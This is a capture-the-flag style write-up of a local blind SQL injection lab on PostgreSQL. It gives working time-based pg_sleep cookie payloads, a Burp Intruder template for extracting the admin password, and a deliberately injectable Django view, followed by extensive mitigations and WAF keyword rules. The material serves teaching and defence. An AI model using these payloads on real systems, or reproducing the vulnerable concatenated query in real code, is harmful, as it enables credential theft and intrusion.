# Lab 15 — Blind SQL injection with time delays and information retrieval

## 1. Lab overview

| Field | Value |
| --- | --- |
| PortSwigger reference | <https://portswigger.net/web-security/sql-injection/blind/lab-time-delays-info-retrieval> |
| Lab id | `psw-sqli-15-time-delays-info-retrieval` |
| Vulnerability class | Blind SQL Injection — time-based boolean oracle |
| CWE | [CWE-89 — Improper Neutralization of Special Elements used in an SQL Command](https://cwe.mitre.org/data/definitions/89.html) |
| Backend | PostgreSQL 16 (separate `db` service) |
| Host URL | <http://127.0.0.1:18015/> |
| Flag | `FLAG{psw-sqli-15-time-delay-extraction-admin-access}` |

### Objective

The landing page silently logs the visitor's `TrackingId` cookie against a `tracked_users` table. The query result is discarded, and any database exception is swallowed, so the HTTP response is byte-identical whether the payload is legitimate, malformed, or successful. There is no boolean oracle, no error reflection, and no server-side timeout. The attacker has to invent a side channel, then use it to recover the `administrator` row from the unrelated `users` table one character at a time, and log in at `/login` to render the flag on `/my-account`.

---

## 2. Exploit walkthrough

The only observable that varies with a payload's truth value is the wall-clock latency of the response, because the injection runs inside the request-serving thread. PostgreSQL's `pg_sleep()` converts a predicate into a measurable delay; wrapping it in a `CASE` expression makes the delay conditional on a sub-select over `users`.

**Step 1 — baseline request**

```http
GET / HTTP/1.1
Host: 127.0.0.1:18015
Cookie: TrackingId=psw-lab-visitor-001
```

The server executes:

```sql
SELECT tracking_id FROM tracked_users
WHERE tracking_id = 'psw-lab-visitor-001'
```

Returns in tens of milliseconds. The response body is the home page; no detail of the lookup is surfaced.

**Step 2 — confirm time-based injection works**

Send a payload that unconditionally sleeps for five seconds:

```
Cookie: TrackingId=x'||pg_sleep(5)--
```

Concatenated SQL:

```sql
SELECT tracking_id FROM tracked_users
WHERE tracking_id = 'x'||pg_sleep(5)--'
```

Postgres's `||` coerces the `void` return of `pg_sleep` to text, the statement parses, and the request returns after roughly five seconds. That confirms the cookie is inside a string literal, single-quote break works, and `--` comments out the trailing quote without error.

**Step 3 — turn the delay into a boolean oracle**

Gate the sleep on a predicate over the administrator password:

```
Cookie: TrackingId=x'||(SELECT CASE WHEN (SUBSTR((SELECT password FROM users WHERE username='administrator'),1,1)='a') THEN pg_sleep(5) ELSE pg_sleep(0) END)::text||'
```

Concatenated SQL:

```sql
SELECT tracking_id FROM tracked_users
WHERE tracking_id = 'x'||(SELECT CASE
    WHEN (SUBSTR((SELECT password FROM users WHERE username='administrator'),1,1)='a')
    THEN pg_sleep(5) ELSE pg_sleep(0) END)::text||''
```

A response that takes five seconds means the first character of the admin password is `a`; a fast response means it is not. The predicate is evaluated inside Postgres, so the lab cannot leak anything by reflection — only by latency.

**Step 4 — automate character-by-character extraction**

The seeded admin password is eight characters drawn from `string.ascii_lowercase` ([shop/management/commands/seed.py:33-34](shop/management/commands/seed.py#L33-L34)), giving a search space of 26 guesses per position for eight positions — 208 requests worst case.

Drive Burp Intruder with two payload positions (`n` and `x`) over the template:

```
TrackingId=x'||(SELECT CASE WHEN (SUBSTR((SELECT password FROM users WHERE username='administrator'),§1§,1)='§a§') THEN pg_sleep(5) ELSE pg_sleep(0) END)::text||'
```

- Payload set 1 (positions): `1, 2, 3, 4, 5, 6, 7, 8`
- Payload set 2 (alphabet): `a`–`z`
- Attack type: cluster bomb
- Grep-extract column: `Response received` time, or enable "Response received" sort

For each position, exactly one character produces a ~5s response. Concatenate the eight winners to recover the password.

**Step 5 — authenticate and collect the flag**

The login form uses Django's ORM ([shop/views.py:97](shop/views.py#L97)), so the recovered credentials have to be exact — there is no second injection point. POST to `/login` with `username=administrator` and the recovered `password`; the session cookie is issued, `/my-account` checks `user.is_admin` ([shop/views.py:120](shop/views.py#L120)), and the flag is rendered from the `flags` table.

---

## 3. Vulnerable code

### Endpoint: `GET /`

[shop/views.py:51-67](shop/views.py#L51-L67)

```python
def home(request: HttpRequest) -> HttpResponse:
    tracking_id = request.COOKIES.get("TrackingId")

    # Vulnerable lookup. Cookie goes straight into the SQL string. The
    # query result is never read back; errors are swallowed. The only
    # observable effect under attack is wall-clock delay.
    if tracking_id is not None:
        query = (
            "SELECT tracking_id FROM tracked_users "
            "WHERE tracking_id = '" + tracking_id + "'"
        )
        try:
            with connection.cursor() as cursor:
                cursor.execute(query)
                cursor.fetchall()
        except Exception:
            pass
```

Four compounding flaws:

1. `tracking_id` arrives from an attacker-controllable cookie with no validation, no length cap, and no character class check.
2. It is pasted into a raw SQL template, so the DB driver receives one opaque string with no parameter markers — it cannot tell code from data.
3. The `try`/`except Exception: pass` on [line 66-67](shop/views.py#L66-L67) hides syntax errors, type errors, and runtime faults. In a boolean-oracle lab that would be merciful; here it removes every signal *except* latency, forcing the attacker toward the time-based channel the lab is designed around.
4. `cursor.fetchall()` on [line 65](shop/views.py#L65) is discarded. Rows never reach the template, so there is nothing an attacker can UNION into.

### Safe endpoint: `POST /login`

[shop/views.py:97](shop/views.py#L97)

```python
user = User.objects.filter(username=username, password=password).first()
```

The ORM binds both fields as parameters, so the login endpoint is not injectable. The attacker cannot pivot to "log in as administrator with `' OR 1=1 --`" — they have to actually know the password, which is exactly what the timing oracle buys them.

### Supporting models

- [shop/models.py:4-19](shop/models.py#L4-L19) — `TrackedUser` is the table the vulnerable cookie query targets. The table is deliberately simple and never leaks data through the page.
- [shop/models.py:22-40](shop/models.py#L22-L40) — `User` (table `users`) stores `username`, `password`, and `is_admin`. This is the secondary table the attacker reads through the side channel.
- [shop/models.py:43-50](shop/models.py#L43-L50) — `Flag` row is rendered from `/my-account` once `is_admin` is true.

### Seed

- [shop/management/commands/seed.py:33-34](shop/management/commands/seed.py#L33-L34) — admin password length 8, alphabet `string.ascii_lowercase`. Short + lowercase is what makes the brute force tractable in a lab timeframe.
- [shop/management/commands/seed.py:47-55](shop/management/commands/seed.py#L47-L55) — a cryptographically random password is written in plaintext to the `users` table.
- [shop/management/commands/seed.py:36](shop/management/commands/seed.py#L36) — flag content.

### Infrastructure

- [docker-compose.yml:4-11](docker-compose.yml#L4-L11) — PostgreSQL 16 is required because `pg_sleep()` is the intended delay primitive.
- [sqli_lab/settings.py:52-61](sqli_lab/settings.py#L52-L61) — the Django connection points at the dedicated `db` service.

---

## 4. Why the vulnerability exists

| Root cause | Effect |
| --- | --- |
| **String concatenation of a cookie value into raw SQL** ([shop/views.py:58-61](shop/views.py#L58-L61)) | The DB driver parses the attacker's `||`, sub-selects and `CASE` as code, not as a string literal. |
| **Blanket `except Exception: pass`** ([shop/views.py:66-67](shop/views.py#L66-L67)) | Removes error-based and boolean signals and leaves latency as the sole side channel — which is also unbounded. |
| **No statement-level timeout on the Postgres session** | `pg_sleep(5)` runs to completion; Postgres will happily block the request thread for minutes if asked. |
| **No rate limiting or anomaly detection on cookie variation** | An attacker can issue hundreds of slow requests from one IP with 208 distinct `TrackingId` values without being throttled. |
| **Plaintext passwords in the `users` table** | Once the attacker gets `SUBSTR(password,n,1)`, the value is immediately usable at `/login`. A hash would stop the oracle from yielding a login credential directly. |
| **Short, narrow-alphabet admin password** | Makes extraction finish in minutes instead of days; a realistic password with mixed case, digits and symbols would still be injectable but vastly more expensive to brute. |

---

## 5. Code-level mitigation

### 5.1 Parameterise the cookie lookup

Single-argument `cursor.execute(query)` is the defect. Bind the value:

```python
# shop/views.py - fixed
if tracking_id is not None:
    query = "SELECT tracking_id FROM tracked_users WHERE tracking_id = %s"
    with connection.cursor() as cursor:
        cursor.execute(query, [tracking_id])
        cursor.fetchall()
```

With the value bound, the attacker's `||pg_sleep(5)--` is compared *as a string* to the `tracking_id` column, matches nothing, and the query returns in microseconds.

### 5.2 Prefer the ORM

The query is a trivial `WHERE` lookup. The ORM already knows how to parameterise, and the raw SQL earns nothing here.

```python
from .models import TrackedUser

if tracking_id is not None:
    TrackedUser.objects.filter(tracking_id=tracking_id).exists()
```

### 5.3 Validate the cookie shape

Even if the query is parameterised, rejecting garbage early is cheap and kills an entire class of probing:

```python
import re

_TRACKING_ID_RE = re.compile(r"^[A-Za-z0-9\-]{1,64}$")

tracking_id = request.COOKIES.get("TrackingId")
if tracking_id is not None and not _TRACKING_ID_RE.match(tracking_id):
    tracking_id = None
```

### 5.4 Do not swallow exceptions silently

Log the exception and return a normal response; swallowing `Exception` hides both injection attempts *and* real bugs.

```python
import logging
log = logging.getLogger(__name__)

try:
    ...
except Exception:
    log.exception("tracking_id lookup failed")
```

A WAF or SIEM will then see a surge of SQL parse errors long before the side channel pays off.

### 5.5 Store passwords as hashes

Use Django's `django.contrib.auth.hashers.make_password` / `check_password`. Even if the attacker extracts the column, they get an Argon2/PBKDF2 digest, not a usable credential. The login view then does:

```python
user = User.objects.filter(username=username).first()
if user is None or not check_password(password, user.password):
    return render(request, "shop/login.html", {"error": "..."})
```

### 5.6 Kill the time oracle at the driver

Set a per-request statement timeout so that even a successful injection cannot pause the response for five seconds:

```python
# shop/views.py - defence in depth
with connection.cursor() as cursor:
    cursor.execute("SET LOCAL statement_timeout = '500ms'")
    cursor.execute(query, [tracking_id])
```

`pg_sleep(5)` then raises `QueryCanceled` after 500 ms and the latency channel collapses.

---

## 6. Network / infrastructure-level mitigation

### 6.1 PostgreSQL statement timeouts

Set `statement_timeout` at the role or database level so no session can exceed a hard ceiling:

```sql
ALTER ROLE labuser SET statement_timeout = '2s';
ALTER ROLE labuser SET idle_in_transaction_session_timeout = '5s';
```

With a 2-second ceiling, a `pg_sleep(5)` payload is indistinguishable from a `pg_sleep(30)` payload (both take 2 s), and the oracle's signal-to-noise ratio degrades sharply. It does not eliminate the channel — the attacker can still gate a 1 s sleep against the ceiling — but it caps the cost of each probe and lets rate limits and WAFs keep up.

### 6.2 Application-level rate limiting on cookie variation

The attack signature is "same IP / same session / many distinct `TrackingId` values, each request taking roughly one of two distinct durations". Rate-limit by:

- Request count per IP per minute at the reverse proxy (nginx `limit_req`, Traefik rate-limit middleware).
- Distinct-`TrackingId`-per-IP counter with a low threshold (five distinct values in an hour is suspicious; 208 is an attack).
- Slow-query alerting: any `/` request that takes longer than 1 s is surfaced in logs and fed into SIEM.

### 6.3 Web Application Firewall

Deploy the OWASP Core Rule Set in front of the service. The tokens that have to appear in any time-based Postgres payload are highly distinctive:

- `pg_sleep`, `PG_SLEEP`, URL-encoded variants.
- `CASE WHEN`, `SUBSTR(`, `SELECT ... FROM users` inside a cookie.
- `||` concatenation in a cookie that is supposed to be a short opaque identifier.

CRS rule family `REQUEST-942` (SQL injection) covers most of these. Drop requests whose cookies contain keywords that cannot occur in a legitimate tracking id.

### 6.4 Least-privilege database role

[docker-compose.yml:8-11](docker-compose.yml#L8-L11) configures `labuser` as the superuser-equivalent of the database. A production equivalent should have:

- `SELECT` on `tracked_users`, `users` (only columns actually needed), `flags`.
- No `EXECUTE` on `pg_sleep`, `pg_read_file`, `pg_ls_dir`, `dblink_*` — revoke from `PUBLIC`.
- No `COPY PROGRAM`, no `CREATE FUNCTION`.
- No access to `pg_shadow`, `pg_authid`.

### 6.5 Network segmentation

[docker-compose.yml:51-54](docker-compose.yml#L51-L54) puts the db on a private bridge. A production deployment should additionally:

- Deny all egress from the db container (no DNS, no IP routing out).
- Bind the web service to loopback-only in the host interface ([docker-compose.yml:34](docker-compose.yml#L34) already does `127.0.0.1:18015:8000`).

### 6.6 Monitoring

Correlate the following signals; any two together warrant a block:

- Request latency on `/` > 1 s.
- `TrackingId` cookie entropy per IP > threshold.
- Postgres log line `canceling statement due to statement timeout` on `SELECT ... FROM tracked_users`.

---

## 7. Defense-in-depth checklist

- [ ] Every `cursor.execute` call takes a second parameter; no `+`, `%`, f-string, or `format()` SQL assembly.
- [ ] ORM by default; raw SQL is code-reviewed and justified.
- [ ] Exceptions raised by the DB driver are logged, not swallowed.
- [ ] Cookie values have a schema (length, alphabet) and are validated before they touch a query.
- [ ] `statement_timeout` is set at the role level, not only per-session.
- [ ] Passwords are stored as Argon2/PBKDF2 hashes — never plaintext.
- [ ] Admin credentials are rotated and complex enough that brute-forcing the oracle is infeasible.
- [ ] Reverse proxy rate-limits per IP and per distinct cookie value.
- [ ] SIEM alerts on slow responses and on SQL parse-error spikes.
- [ ] Database role is least-privilege; dangerous functions (`pg_sleep`, `dblink`, `COPY PROGRAM`) are revoked from `PUBLIC`.
- [ ] Database container has no outbound network path.
- [ ] SAST rules (`bandit`, `semgrep`) block `cursor.execute(str + var)` and bare `except Exception: pass`.

---

## 8. References

- PortSwigger Web Security Academy — [Blind SQL injection with time delays and information retrieval](https://portswigger.net/web-security/sql-injection/blind/lab-time-delays-info-retrieval)
- OWASP — [SQL Injection Prevention Cheat Sheet](https://cheatsheetseries.owasp.org/cheatsheets/SQL_Injection_Prevention_Cheat_Sheet.html)
- OWASP — [Blind SQL Injection](https://owasp.org/www-community/attacks/Blind_SQL_Injection)
- CWE-89 — <https://cwe.mitre.org/data/definitions/89.html>
- PostgreSQL docs — [`pg_sleep`](https://www.postgresql.org/docs/current/functions-datetime.html#FUNCTIONS-DATETIME-DELAY) and [`statement_timeout`](https://www.postgresql.org/docs/current/runtime-config-client.html#GUC-STATEMENT-TIMEOUT)
- Django docs — [Executing custom SQL directly](https://docs.djangoproject.com/en/5.0/topics/db/sql/#executing-custom-sql-directly)
- OWASP CRS — <https://coreruleset.org/>
